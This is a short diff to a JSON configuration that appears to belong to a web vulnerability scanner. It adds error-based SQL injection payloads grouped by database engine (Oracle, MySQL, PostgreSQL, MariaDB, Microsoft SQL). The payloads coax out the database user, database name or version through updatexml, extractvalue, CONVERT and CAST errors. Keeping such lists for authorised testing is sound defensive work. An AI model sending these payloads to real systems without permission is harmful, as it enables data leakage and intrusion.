@@ -16,5 +16,22 @@
             ],
             "type": "regex"
         }
-    ]
+    ],
+    "technology_specific_payloads":
+    {
+        "oracle":["' AND 1=to_number((SELECT user FROM dual))--"],
+        "mysql":["' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
+                "' AND extractvalue(1,concat(0x7e,database(),0x7e))--"],
+        "postgresql":[
+            "'::int",
+            "'||(SELECT version())||'"
+        ],
+        "mariadb":[
+                "' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
+                "' AND extractvalue(1,concat(0x7e,database(),0x7e))--"
+        ],
+        "microsoftsql":[
+            "' AND 1=CONVERT(int,(SELECT @@version))--",
+            "' AND 1=CAST((SELECT SYSTEM_USER) AS int)--"]
+    }
 }
